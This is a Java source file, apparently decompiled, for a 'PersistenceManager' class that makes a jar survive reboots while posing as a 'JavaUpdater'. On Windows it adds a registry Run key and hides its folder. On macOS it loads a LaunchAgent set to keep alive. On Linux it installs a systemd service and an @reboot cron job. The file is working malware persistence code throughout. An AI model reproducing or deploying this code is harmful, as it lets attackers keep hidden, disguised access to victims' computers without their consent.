import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class PersistenceManager {
   public void installPersistence() throws IOException {
      String var1 = System.getProperty("os.name").toLowerCase();
      String var2 = "JavaUpdater";
      String var3 = this.getCurrentJarPath();
      if (!this.isAlreadyPersistent()) {
         if (var1.contains("win")) {
            this.installWindowsPersistence(var2, var3);
         } else if (var1.contains("mac")) {
            this.installMacPersistence(var2, var3);
         } else if (var1.contains("nix") || var1.contains("nux") || var1.contains("aix")) {
            this.installLinuxPersistence(var2, var3);
         }

      }
   }

   private boolean isAlreadyPersistent() {
      String var1 = System.getProperty("os.name").toLowerCase();
      String var2 = "JavaUpdater";

      try {
         Process var3;
         if (var1.contains("win")) {
            var3 = Runtime.getRuntime().exec("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + var2);
            return var3.waitFor() == 0;
         } else if (var1.contains("mac")) {
            return Files.exists(Paths.get(System.getProperty("user.home"), "Library", "LaunchAgents", var2 + ".plist"), new LinkOption[0]);
         } else {
            var3 = Runtime.getRuntime().exec("crontab -l");
            BufferedReader var4 = new BufferedReader(new InputStreamReader(var3.getInputStream()));

            while(true) {
               boolean var6;
               try {
                  String var5;
                  if ((var5 = var4.readLine()) == null) {
                     break;
                  }

                  if (!var5.contains(var2)) {
                     continue;
                  }

                  var6 = true;
               } catch (Throwable var8) {
                  try {
                     var4.close();
                  } catch (Throwable var7) {
                     var8.addSuppressed(var7);
                  }

                  throw var8;
               }

               var4.close();
               return var6;
            }

            var4.close();
            return false;
         }
      } catch (Exception var9) {
         return false;
      }
   }

   private void installWindowsPersistence(String var1, String var2) throws IOException {
      String var3 = System.getenv("APPDATA") + "\\" + var1;
      Files.createDirectories(Paths.get(var3));
      Path var4 = Paths.get(var3, var1 + ".jar");
      Files.copy(Paths.get(var2), var4, StandardCopyOption.REPLACE_EXISTING);
      String var5 = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
      String var6 = "reg add " + var5 + " /v " + var1 + " /t REG_SZ /d \"" + var4 + "\" /f";
      Runtime.getRuntime().exec(var6);
      Runtime.getRuntime().exec("attrib +h " + var3);
   }

   private void installMacPersistence(String var1, String var2) throws IOException {
      String var3 = System.getProperty("user.home") + "/Library/LaunchAgents/" + var1 + ".plist";
      String var4 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>" + var1 + "</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/usr/bin/java</string>\n        <string>-jar</string>\n        <string>" + var2 + "</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n    <key>KeepAlive</key>\n    <true/>\n</dict>\n</plist>";
      Files.write(Paths.get(var3), var4.getBytes(), new OpenOption[0]);
      Runtime.getRuntime().exec("launchctl load " + var3);
   }

   private void installLinuxPersistence(String var1, String var2) throws IOException {
      String var3 = "/opt/" + var1;
      Files.createDirectories(Paths.get(var3));
      Path var4 = Paths.get(var3, var1 + ".jar");
      Files.copy(Paths.get(var2), var4, StandardCopyOption.REPLACE_EXISTING);
      String var5 = "[Unit]\nDescription=" + var1 + "\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/java -jar " + var4 + "\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\n";
      String var6 = "/etc/systemd/system/" + var1 + ".service";
      Files.write(Paths.get(var6), var5.getBytes(), new OpenOption[0]);
      Runtime.getRuntime().exec("systemctl daemon-reload");
      Runtime.getRuntime().exec("systemctl enable " + var1);
      Runtime.getRuntime().exec("systemctl start " + var1);
      String var7 = "@reboot java -jar " + var4;
      Runtime.getRuntime().exec(new String[]{"bash", "-c", "(crontab -l 2>/dev/null; echo \"" + var7 + "\") | crontab -"});
   }

   private String getCurrentJarPath() {
      try {
         return (new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI())).getPath();
      } catch (Exception var2) {
         return System.getProperty("java.class.path");
      }
   }
}
